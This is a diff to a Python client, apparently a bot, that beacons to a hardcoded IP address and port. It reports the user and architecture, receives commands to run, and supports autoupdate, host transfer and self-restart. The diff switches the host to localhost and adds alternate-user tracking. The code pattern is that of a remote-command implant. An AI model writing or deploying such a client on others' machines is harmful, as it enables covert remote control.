@@ -22,7 +22,7 @@ except:
 __version__ = "1.1"
 
 HOST = '50.159.66.236'
-#HOST = 'localhost'
+HOST = 'localhost'
 PORT = 1708
 HOSTINFOFILE = '.host'
 IDFILE = '.id'
@@ -368,7 +368,7 @@ class WriterWrapper:
 
 
 # Scripts
-def main(host=HOST, port=PORT, botid=None):
+def main(host=HOST, port=PORT, botid=None, altuser=None):
     '''
     Main loop, checks internet and attempts to connect to server,
     on error continues to check every minute
@@ -381,6 +381,11 @@ def main(host=HOST, port=PORT, botid=None):
             try:
                 # Get and send info
                 user, arch = getInfo()
+                if altuser is not None:
+                    if altuser != user:
+                        user = altuser + " (" + user + ")"
+                else:
+                    altuser = user
                 infodict = dict(user=user, arch=arch, version=__version__, bid=botid)
                 json_str = json.dumps(infodict)
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -390,7 +395,7 @@ def main(host=HOST, port=PORT, botid=None):
                     s = ssl.wrap_socket(s)
                 fs = FormatSocket(s)
                 fs.format_send(json_str)
-                serve(fs)
+                serve(fs,altuser)
             except Exception as e:
                 sys.stderr.write("[!] "+str(e))
         if RUNNING:
@@ -398,7 +403,7 @@ def main(host=HOST, port=PORT, botid=None):
             time.sleep(10)
 
 
-def serve(sock):
+def serve(sock,user):
     '''
     Check the socket, setup various processes, run commands as requested,
     exits on autoupdate or host transfer.
@@ -499,7 +504,8 @@ def serve(sock):
                 if ASSIGN_ID in recvjson:
                     id = recvjson[ASSIGN_ID]
                     with open(IDFILE,"w") as idfile:
-                        idfile.write(id)
+                        idfile.write(id + "\n")
+                        idfile.write(user)
                 # Standard evaluation
                 if STDIN in recvjson:
                     with proclock:
@@ -718,9 +724,14 @@ if __name__ == "__main__":
                 hostport = checkport
             except:
                 pass
+        altuser = None
         if os.path.exists(IDFILE):
             with open(IDFILE,"r") as f:
-                bid = f.read()
-        main(hostaddr,hostport,bid)
-        if (not RUNNING):
+                bid = f.readline()
+                try:
+                    altuser = f.readline()
+                except:
+                    altuser = None
+        main(hostaddr,hostport,bid,altuser)
+        if (not RUNNING) and RESTART:
             os.execv(sys.executable, [sys.executable] + sys.argv)
